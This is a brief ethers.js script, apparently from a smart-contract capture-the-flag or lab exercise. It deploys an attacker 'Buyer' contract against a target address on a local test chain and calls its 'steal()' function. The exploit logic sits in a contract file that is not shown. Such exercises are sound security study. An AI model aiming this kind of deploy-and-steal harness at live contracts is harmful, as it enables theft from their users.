const { ethers } =  require("ethers"); 
const fs = require('fs');

const url = "http://localhost:8545";

const provider = new ethers.providers.JsonRpcProvider(url);

// Getting the accounts
const signer = provider.getSigner(19);

contract_address = "0xCe85503De9399D4dECa3c0b2bb3e9e7CFCBf9C6B"

const metadata = JSON.parse(fs.readFileSync('../artifacts/contracts/Buyer.sol/Buyer.json').toString())

buyerFactory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer)


;(async () => {
    price = ethers.utils.formatUnits(await provider.getGasPrice(), 'gwei')
    deployOptions = {gasLimit: 1000000, gasPrice: ethers.utils.parseUnits(price, 'gwei')}

    buyerContract = await buyerFactory.deploy(contract_address, deployOptions)
    await buyerContract.deployTransaction.wait()

    tx = await buyerContract.steal();
    await tx.wait()
})();